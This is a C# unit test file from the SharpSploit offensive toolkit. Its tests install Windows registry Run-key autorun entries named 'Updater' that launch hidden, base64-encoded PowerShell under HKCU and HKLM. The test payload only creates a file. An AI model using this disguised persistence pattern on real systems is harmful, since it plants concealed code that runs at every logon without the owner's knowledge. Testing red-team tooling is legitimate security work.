// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Linq;
using Microsoft.Win32;
using Microsoft.VisualStudio.TestTools.UnitTesting;

using SharpSploit.Persistence;

namespace SharpSploit.Tests.Persistence
{
    [TestClass]
    public class AutorunTests
    {
        [TestMethod]
        public void InstallHKCUAutorun()
        {
            string cmd = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(@"New-Item -Path C:\Temp\hkcu.txt -ItemType File"));
            Autorun.InstallAutorun($@"C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -enc {cmd}", Autorun.Hive.HKCU);

            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false);
            Assert.IsTrue(key.GetValueNames().Contains("Updater"));
        }

        [TestMethod]
        public void InstallHKLMAutorun()
        {
            string cmd = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(@"New-Item -Path C:\Temp\hklm.txt -ItemType File"));
            Autorun.InstallAutorun($@"C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -enc {cmd}", Autorun.Hive.HKLM);

            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false);
            Assert.IsTrue(key.GetValueNames().Contains("Updater"));
        }
    }
}